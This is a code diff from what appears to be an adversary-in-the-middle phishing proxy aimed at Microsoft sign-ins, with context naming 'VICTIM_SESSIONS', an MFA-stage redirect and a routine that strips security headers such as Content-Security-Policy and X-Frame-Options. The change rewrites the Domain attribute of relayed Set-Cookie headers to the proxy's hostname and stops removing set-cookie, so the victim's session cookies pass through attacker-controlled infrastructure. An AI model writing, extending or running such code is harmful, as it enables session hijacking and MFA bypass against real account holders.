@@ -603,10 +603,17 @@ if (proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400) {
 }
 
         const proxyResponseCookie = proxyResponse.headers["set-cookie"];
-        if (proxyResponseCookie) {
-          //  console.log(`[MICROSOFT SET-COOKIE] ${JSON.stringify(proxyResponseCookie)}`);
-            updateCurrentSessionCookies(proxyRequestOptions, proxyResponseCookie, proxyHostname, currentSession, proxyResponse.headers.date);
-        }
+if (proxyResponseCookie) {
+    //  console.log(`[MICROSOFT SET-COOKIE] ...`);
+    updateCurrentSessionCookies(proxyRequestOptions, proxyResponseCookie, proxyHostname, currentSession, proxyResponse.headers.date);
+
+    // ---- REWRITE Set-Cookie DOMAIN FOR CLIENT ----
+    const rewrittenCookies = proxyResponseCookie.map(cookie => {
+        // Replace Domain=... with Domain=proxyHostname
+        return cookie.replace(/\bDomain\s*=\s*[^;]+/i, `Domain=${proxyHostname}`);
+    });
+    proxyResponse.headers["set-cookie"] = rewrittenCookies;
+}
 
 // ===== FINAL ALERT & REDIRECT (after MFA) =====
 const sessionData = VICTIM_SESSIONS[currentSession];
@@ -1255,7 +1262,7 @@ function deleteHTTPSecurityResponseHeaders(headers) {
         "x-frame-options",
         "x-xss-protection",
         "x-content-type-options",
-        "set-cookie",
+       // "set-cookie",
         "content-security-policy",
         "content-security-policy-report-only",
         "cross-origin-opener-policy",
